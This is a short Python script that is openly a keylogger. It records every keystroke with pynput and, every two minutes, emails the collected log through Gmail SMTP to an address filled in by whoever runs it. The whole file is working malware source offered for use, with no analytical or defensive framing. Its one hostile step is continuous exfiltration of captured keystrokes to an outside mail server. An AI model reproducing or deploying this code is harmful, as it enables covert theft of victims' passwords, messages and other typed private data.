import pynput.keyboard
import smtplib
import threading
logs=""
def callback_function(key): 
    global logs
    try:
        logs=logs+str(key.char.encode("utf-8"))

    except AttributeError:
        if key == key.space:
            logs=logs+" "
        else:
            logs=logs+str(key)
def send_email(email,password,message):                                                                                                                                                                                                
    email_server=smtplib.SMTP("smtp.gmail.com",587)
    email_server.starttls()
    email_server.login(email,password)
    email_server.sendmail(email,email,message)
    email_server.quit()
def thread():
    global logs
    send_email("your_email","your_password",logs)
    logs=""
    timer_object=threading.Timer(120,thread)
    timer_object.start()
keylogger= pynput.keyboard.Listener(on_press=callback_function)    
with keylogger:                                                                                                                                      
    thread()
    keylogger.join()
